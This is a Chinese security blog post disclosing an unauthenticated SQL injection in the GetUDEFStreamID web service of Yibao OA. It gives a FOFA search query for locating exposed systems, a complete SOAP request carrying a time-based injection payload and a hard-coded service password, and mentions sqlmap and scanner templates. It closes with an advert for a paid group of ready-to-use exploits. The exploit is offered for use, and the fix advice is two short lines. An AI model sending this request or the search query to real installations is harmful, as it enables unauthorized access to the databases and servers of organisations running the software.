#  易宝OA GetUDEFStreamID SQL注入漏洞   
Superhero  nday POC   2024-12-26 04:09  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理(档案和业务管理)、协同办公等多种功能。系统内置了多种流程模板，如请假、报销、采购等，企业可以根据自身需求进行定制和优化，实现流程的自动化和规范化管理。支持档案和业务管理，包括知识文档的上传、分类、搜索和分享，有助于企业建立知识库，提高员工的知识水平和业务能力。还具备人事管理、日程安排、邮件通知等多种功能，能够满足企业日常办公的多样化需求。  
**01******  
  
**漏洞概述**  
  
  
易宝OA GetUDEFStreamID 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
app="顶讯科技-易宝OA系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcgm9a7xqLv83m2rDzAtGGHJt9NQib1jkgUC42tAwqokThtFbaoBQtjia3Q/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /WebService/BasicService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetUDEFStreamID"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUDEFStreamID xmlns="http://tempuri.org/">
      <tableName>';WAITFOR DELAY '0:0:5'--</tableName>
      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
    </GetUDEFStreamID>
  </soap:Body>
</soap:Envelope>
```  
  
延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcg8vdVhrI3qPdOL0kvRia7Q1EjuVIS4I28iaIrVWMvVbXYFQWmFvWYeuwA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcgAiaNIibO2HsZ8OfBfqnK5HCHwUQ5sSNeRSv06ANLREBLR3TeYuktDOqg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcgSLXGh6gcAOb4rQLcBib3Z1gRYcRtG0S7iaPalzNC8S2QPMptV4u3WLBA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcgGLcXN2tmibDgvibtENAmBO6RSVXMpibkw3cHJpfP7pC4q4uP1xmSIbcIA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLc0osu4lr46sNCAL6OzEcgmzib5tRrwlG08bCjUVahg0lorMmyfd1Io1HPZs9ABHWMKNo4Umsic73w/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、打对应补丁或者升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
